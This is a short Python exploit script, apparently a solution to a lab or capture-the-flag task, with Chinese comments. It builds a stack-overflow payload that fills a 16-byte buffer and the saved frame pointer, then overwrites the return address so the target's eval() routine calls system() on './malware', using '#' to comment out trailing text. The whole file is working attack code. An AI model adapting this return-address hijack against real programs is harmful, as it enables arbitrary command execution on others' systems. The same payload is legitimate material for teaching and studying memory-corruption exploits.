#!/usr/bin/env python3
"""Task 1: 栈溢出,把返回地址改到 eval() 内部 'mov $command_buf,%edi; call system'."""
import sys
payload  = b"./malware #"                      # '#' 注释掉 eval 拼接的 ))
payload += b"A" * (24 - len(payload))          # 填满 expression[16] + saved rbp[8]
payload += (0x401A6B).to_bytes(8, "little")    # 返回地址 -> eval+0x94
sys.stdout.buffer.write(payload)
